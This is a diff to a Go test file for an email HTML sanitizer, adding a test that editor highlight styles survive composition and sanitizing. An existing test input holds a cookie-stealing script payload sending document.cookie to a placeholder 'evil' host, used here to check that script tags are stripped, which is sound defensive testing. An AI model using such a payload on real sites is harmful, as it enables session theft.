@@ -1,8 +1,10 @@
 package app
 
-import "strings"
-
-import "testing"
+import (
+	"context"
+	"strings"
+	"testing"
+)
 
 func TestSanitizeStripsScript(t *testing.T) {
 	in := `<p>Hello</p><script>fetch('//evil/'+document.cookie)</script>`
@@ -42,6 +44,23 @@ func TestSanitizeKeepsWhatMailClientsRender(t *testing.T) {
 	for _, want := range []string{"<table", "<td", "style=", "<b>", "href=", "<img", "alt="} {
 		if !strings.Contains(got, want) {
 			t.Errorf("lost %q from %q", want, got)
+		}
+	}
+}
+
+func TestComposeBodyKeepsEditorHighlight(t *testing.T) {
+	in := `<p>Before <span style="font-weight: bold; background-color: rgb(255, 242, 154); color: rgb(192, 57, 43);">highlight</span> after</p>`
+	body, plain, format, err := (&Service{}).composeBody(context.Background(), 1, CampaignInput{
+		Body: in, Format: FormatHTML,
+	}, Operator{})
+	if err != nil || format != FormatHTML || plain != "Before highlight after" {
+		t.Fatalf("compose body: format=%q, plain=%q, err=%v", format, plain, err)
+	}
+	for _, got := range []string{body, SanitizeForReading(body)} {
+		for _, want := range []string{"background-color: rgb(255, 242, 154)", "color: rgb(192, 57, 43)", "font-weight: bold", ">highlight</span>"} {
+			if !strings.Contains(got, want) {
+				t.Errorf("lost %q from %q", want, got)
+			}
 		}
 	}
 }
